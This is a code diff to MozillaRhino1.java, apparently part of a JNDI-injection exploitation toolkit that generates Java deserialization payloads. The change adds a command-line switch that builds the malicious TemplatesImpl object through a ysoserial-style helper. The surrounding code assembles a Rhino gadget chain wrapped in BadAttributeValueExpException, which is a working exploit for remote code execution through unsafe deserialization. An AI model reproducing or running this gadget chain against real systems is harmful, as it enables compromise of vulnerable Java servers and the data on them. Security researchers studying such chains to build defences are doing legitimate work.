@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
@@ -14,6 +15,8 @@ import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /*
     by @matthias_kaiser
@@ -53,7 +56,14 @@ public class MozillaRhino1 implements ObjectPayload<Object>{
         Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
         getter.set(slot, memberboxes);
 
-        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(type,param), TemplatesImpl.class);
+        final Object tpl;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            tpl = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            tpl = Gadgets.createTemplatesImpl(type, param);
+        }
+
+        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, tpl, TemplatesImpl.class);
         idScriptableObject.setPrototype(nativeObject);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
